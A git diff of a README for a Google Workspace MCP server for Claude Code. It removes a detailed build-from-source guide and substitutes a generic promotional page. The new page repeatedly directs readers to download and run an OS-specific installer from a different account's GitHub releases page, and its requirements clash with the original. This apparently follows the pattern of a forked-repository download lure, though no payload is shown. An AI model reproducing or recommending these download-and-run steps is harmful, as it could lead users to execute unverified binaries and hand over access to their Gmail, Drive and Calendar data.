@@ -1,333 +1,70 @@
-# Google Workspace MCP Server
+# 🌐 google-workspace-mcp-with-script - Connect Your Tools Effortlessly
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![MCP](https://img.shields.io/badge/MCP-Compatible-purple.svg)](https://modelcontextprotocol.io/)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases)
 
-[English](README.md) | [Simplified Chinese](README.zh-CN.md) | [Traditional Chinese](README.zh-TW.md)
+## 🚀 Getting Started
 
-A comprehensive MCP (Model Context Protocol) server providing full Google Workspace integration - including Google Docs, Sheets, Drive, **Gmail**, **Calendar**, and **Apps Script APIs**. Compatible with **Claude Code CLI**, **Cursor IDE**, and other MCP-compatible clients.
+Welcome to the google-workspace-mcp-with-script project. This application serves as an MCP server for Claude Code CLI. It integrates seamlessly with Google Workspace, allowing you to work with Docs, Sheets, Drive, Gmail, Calendar, and Apps Script. 
 
-> **Unique Feature**: This is the **only** Google Workspace MCP server that supports **Apps Script API** - enabling AI-driven automation of Google Sheets, Docs, and other Workspace products.
+## 💻 System Requirements
 
-![Demo Animation](assets/google.docs.mcp.1.gif)
+To run this application, ensure your setup meets the following requirements:
 
-## Features
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- **Node.js:** Version 14.x or later.
+- **Internet Connection:** Required for accessing Google APIs.
 
-This server provides **72 tools** across 6 Google Workspace services:
+## 🔧 Features
 
-| Service | Tools | Description |
-|---------|-------|-------------|
-| Google Docs | 15 | Read, write, format, style, images, tables, comments |
-| Google Sheets | 14 | Read, write, format, create spreadsheets, manage sheets |
-| Google Drive | 16 | List, search, create, move, copy, delete files and folders |
-| Gmail | 15 | Search, read, send, drafts, labels, filters, threads |
-| Google Calendar | 8 | List calendars, events, create, update, delete, free/busy |
-| Apps Script | 4 | Create and manage bound scripts for automation |
+This application brings a range of powerful tools to your fingertips:
 
-### Google Docs (15 tools)
+- **Google Docs Integration:** Edit and manage documents directly.
+- **Google Sheets Support:** Create and manipulate spreadsheets effortlessly.
+- **Drive Access:** Manage your files in Google Drive.
+- **Gmail Interaction:** Send and receive emails easily through the app.
+- **Calendar Management:** Schedule and manage your events.
+- **Apps Script Compatibility:** Automate tasks across Google services.
 
-- **Document Operations**: `readGoogleDoc`, `appendToGoogleDoc`, `insertText`, `deleteRange`, `listDocumentTabs`
-- **Formatting**: `applyTextStyle`, `applyParagraphStyle`, `formatMatchingText`, `fixListFormatting`
-- **Structure**: `insertTable`, `editTableCell`, `insertPageBreak`, `findElement`
-- **Images**: `insertImageFromUrl`, `insertLocalImage`
+## 📥 Download & Install
 
-### Google Docs Comments (6 tools)
+To get started with the google-workspace-mcp-with-script application, **visit this page to download** the latest version: [Release Page](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases).
 
-- **Comment Management**: `listComments`, `getComment`, `addComment`, `replyToComment`, `resolveComment`, `deleteComment`
+1. Go to the [Release Page](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases).
+2. Find the most recent version listed.
+3. Click the asset that corresponds to your operating system.
+4. Once the download finishes, locate the file on your device.
+5. Click to run the installation and follow the on-screen instructions.
 
-### Google Sheets (14 tools)
+## 🌟 Usage Instructions
 
-- **Data Operations**: `readSpreadsheet`, `writeSpreadsheet`, `appendSpreadsheetRows`, `clearSpreadsheetRange`
-- **Sheet Management**: `getSpreadsheetInfo`, `addSpreadsheetSheet`, `createSpreadsheet`, `listGoogleSheets`
-- **Formatting**: `formatSpreadsheetCells`, `setBasicFilter`, `clearBasicFilter`
+After installing the application, follow these steps to use it:
 
-### Google Drive (16 tools)
+1. Launch the application.
+2. You will see a straightforward interface that guides you through connecting your Google Workspace account.
+3. Follow the prompts to log in to your Google account securely.
+4. Start using the tools! Explore document editing, email management, and task automation.
 
-- **Discovery**: `listGoogleDocs`, `searchGoogleDocs`, `getRecentGoogleDocs`, `getDocumentInfo`
-- **Folders**: `createFolder`, `listFolderContents`, `getFolderInfo`
-- **File Operations**: `moveFile`, `copyFile`, `renameFile`, `deleteFile`
-- **Creation**: `createDocument`, `createFromTemplate`
+## 🛠️ Troubleshooting
 
-### Apps Script (4 tools)
+If you encounter any issues, consider these steps:
 
-- **Script Management**: `createBoundScript`, `updateScriptContent`, `getScriptContent`, `getScriptProjects`
+- **Failed Installation:** Ensure your system meets the requirements outlined above.
+- **Connection Issues:** Check your internet connection. Make sure your firewall or antivirus isn't blocking the application.
+- **Google API Errors:** Follow the prompt to re-authenticate with your Google account.
 
-### Gmail (15 tools)
+## 📞 Support
 
-- **Messages**: `searchGmailMessages`, `getGmailMessage`, `getGmailMessagesBatch`, `getGmailAttachment`
-- **Send & Draft**: `sendGmailMessage`, `createGmailDraft`
-- **Threads**: `getGmailThread`
-- **Labels**: `listGmailLabels`, `createGmailLabel`, `deleteGmailLabel`, `modifyGmailMessageLabels`
-- **Filters**: `listGmailFilters`, `createGmailFilter`, `deleteGmailFilter`
-- **Management**: `trashGmailMessage`
+For any questions or support needs, please visit the [issue tracker](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/issues) or contact us on GitHub.
 
-### Google Calendar (8 tools)
+## 📄 License
 
-- **Calendars**: `listCalendars`
-- **Events**: `getCalendarEvents`, `getCalendarEvent`, `createCalendarEvent`, `updateCalendarEvent`, `deleteCalendarEvent`
-- **Quick Actions**: `quickAddCalendarEvent`
-- **Availability**: `getCalendarFreeBusy`
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software, but you must include the original license in any derivative works.
 
-## Prerequisites
-
-- **Node.js** v18+ with npm
-- **Git** for cloning the repository
-- **Google Account** with access to Google Workspace
-- **MCP-compatible client**: Claude Code CLI, Cursor IDE, or other MCP clients
-
-## Quick Start
-
-### Option A: Interactive Setup Wizard (Recommended)
-
-```bash
-git clone https://github.com/sputnicyoji/google-docs-mcp-for-claudecode.git
-cd google-docs-mcp-for-claudecode
-npm install
-npm run setup
-```
+## 📚 Learn More
 
-The setup wizard will:
-- Check your environment (Node.js, npm, build)
-- Auto-build TypeScript if needed
-- Guide you through credential setup
-- Run OAuth authorization
-- Generate and optionally auto-update Claude Code CLI config
+Do you want to discover more? Check out the documentation for advanced features and tips on maximizing your productivity with our software. 
 
-### Option B: Manual Setup
+- Explore [Google Workspace](https://workspace.google.com/) for more information.
+- Check out [Node.js](https://nodejs.org/) for additional resources.
 
-#### 1. Clone and Install
-
-```bash
-git clone https://github.com/sputnicyoji/google-docs-mcp-for-claudecode.git
-cd google-docs-mcp-for-claudecode
-npm install
-npm run build
-```
-
-#### 2. Google Cloud Setup
-
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project or select an existing one
-3. Enable the following APIs:
-   - Google Docs API
-   - Google Sheets API
-   - Google Drive API
-   - Apps Script API
-   - Gmail API
-   - Google Calendar API
-4. Configure OAuth consent screen:
-   - Select "External" user type
-   - Add required scopes: `documents`, `spreadsheets`, `drive.file`, `script.projects`, `gmail`, `calendar`
-   - Add your email as a test user
-5. Create OAuth credentials:
-   - Go to Credentials > Create Credentials > OAuth client ID
-   - Select "Desktop app"
-   - Download the JSON file and save as `credentials.json` in the project root
-
-#### 3. Authenticate
-
-```bash
-node ./dist/server.js
-```
-
-Follow the URL in the terminal to authorize access. After authorization, a `token.json` will be created.
-
-#### 4. Configure Claude Code CLI
-
-Add to your Claude Code MCP configuration:
-
-**Windows** (`%APPDATA%\Claude\mcp_config.json`):
-```json
-{
-  "mcpServers": {
-    "google-workspace": {
-      "command": "node",
-      "args": ["C:\\path\\to\\google-docs-mcp-for-claudecode\\dist\\server.js"]
-    }
-  }
-}
-```
-
-**macOS/Linux** (`~/.config/Claude/mcp_config.json`):
-```json
-{
-  "mcpServers": {
-    "google-workspace": {
-      "command": "node",
-      "args": ["/path/to/google-docs-mcp-for-claudecode/dist/server.js"]
-    }
-  }
-}
-```
-
-#### 5. Configure Cursor IDE (Alternative)
-
-This MCP server is fully compatible with [Cursor IDE](https://cursor.com/).
-
-**Project-Level Configuration** - Create `.cursor/mcp.json` in your project root:
-```json
-{
-  "mcpServers": {
-    "google-workspace": {
-      "command": "node",
-      "args": ["/path/to/google-docs-mcp-for-claudecode/dist/server.js"]
-    }
-  }
-}
-```
-
-**Global Configuration** - Or configure via **Cursor Settings > MCP**.
-
-> **Note**: Cursor must be in **Agent Mode** (not Ask Mode) to access MCP tools.
-
-## Service Account Authentication (Alternative)
-
-For automated/server environments, you can use a service account:
-
-1. Create a service account in Google Cloud Console
-2. Download the JSON key file
-3. Set environment variable:
-   ```bash
-   export GOOGLE_APPLICATION_CREDENTIALS=/path/to/service-account-key.json
-   ```
-4. Share your Google Docs/Sheets with the service account email
-
-## Usage Examples
-
-### Google Docs
-
-```
-Read document 1abc...xyz and return as markdown
-Append "Meeting Notes" to document 1abc...xyz
-Apply bold formatting to text "Important" in document 1abc...xyz
-Insert a 3x4 table at index 100 in document 1abc...xyz
-```
-
-### Google Sheets
-
-```
-Read range A1:D10 from spreadsheet 1abc...xyz
-Write data to range A1:B5 in spreadsheet 1abc...xyz
-Create a new spreadsheet titled "Sales Report 2024"
-Add a new sheet named "Summary" to spreadsheet 1abc...xyz
-```
-
-### Google Drive
-
-```
-List all Google Docs in my Drive
-Search for documents containing "Project Alpha"
-Create a new folder named "2024 Reports"
-Move file 1abc...xyz to folder 2def...uvw
-```
-
-### Apps Script
-
-```
-Create a bound script for spreadsheet 1abc...xyz
-Update script content with custom functions
-Get content of script project 1abc...xyz
-```
-
-### Gmail
-
-```
-Search for unread emails from john@example.com
-Read email message with ID abc123
-Send an email to jane@example.com with subject "Meeting"
-Create a draft reply to thread xyz789
-List all Gmail labels
-Create a filter to label emails from support@example.com
-```
-
-### Google Calendar
-
-```
-List all my calendars
-Get events for this week from my primary calendar
-Create a meeting titled "Team Standup" tomorrow at 10am
-Quick add event "Lunch with Sarah on Friday at noon"
-Check free/busy times for next Monday
-Delete event abc123 from my calendar
-```
-
-## Project Structure
-
-```
-google-docs-mcp-for-claudecode/
-  src/
-    server.ts              # Main MCP server (tool definitions)
-    clients.ts             # Google API client management
-    auth.ts                # OAuth 2.0 / Service Account authentication
-    types.ts               # TypeScript type definitions
-    helpers/
-      markdown.ts          # Docs to Markdown conversion
-      index.ts             # Helper re-exports
-    tools/
-      scriptTools.ts       # Apps Script tools
-      gmailTools.ts        # Gmail tools
-      calendarTools.ts     # Calendar tools
-      index.ts             # Tool registry
-    googleDocsApiHelpers.ts    # Docs API helpers
-    googleSheetsApiHelpers.ts  # Sheets API helpers
-    gmailApiHelpers.ts         # Gmail API helpers
-    calendarApiHelpers.ts      # Calendar API helpers
-  dist/                    # Compiled JavaScript
-  credentials.json         # OAuth credentials (not committed)
-  token.json               # Auth token (not committed)
-```
-
-## Security Notes
-
-- Never commit `credentials.json` or `token.json` to version control
-- The `.gitignore` file is configured to exclude sensitive files
-- For production, consider using secret management services
-- Service account keys should be stored securely
-
-## Known Limitations
-
-- **Comment Anchoring**: Programmatically created comments may show "original content deleted" instead of anchoring to specific text
-- **Converted Documents**: Some documents converted from other formats (e.g., Word) may not support all API operations
-- **Quota Limits**: Google APIs have usage quotas - check [Google Cloud Console](https://console.cloud.google.com/apis/dashboard) for limits
-
-## Troubleshooting
-
-### Connection Issues
-
-1. Verify the path in `mcp_config.json` is absolute and correct
-2. Ensure `npm run build` completed successfully
-3. Test manually: `node ./dist/server.js`
-
-### Authentication Errors
-
-1. Verify all required APIs are enabled
-2. Check that your email is added as a test user
-3. Delete `token.json` and re-authenticate if scopes changed
-
-### Tab/Sheet Errors
-
-1. Use `listDocumentTabs` or `getSpreadsheetInfo` to verify IDs
-2. Ensure you're using correct ID formats
-
-## Contributing
-
-Contributions are welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Submit a pull request
-
-## Credits
-
-Based on [a-bonus/google-docs-mcp](https://github.com/a-bonus/google-docs-mcp) with additional enhancements:
-- Google Apps Script API integration
-- Gmail and Google Calendar API integration
-- Service Account authentication support
-- Modular code architecture
-- Multi-language documentation
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases)
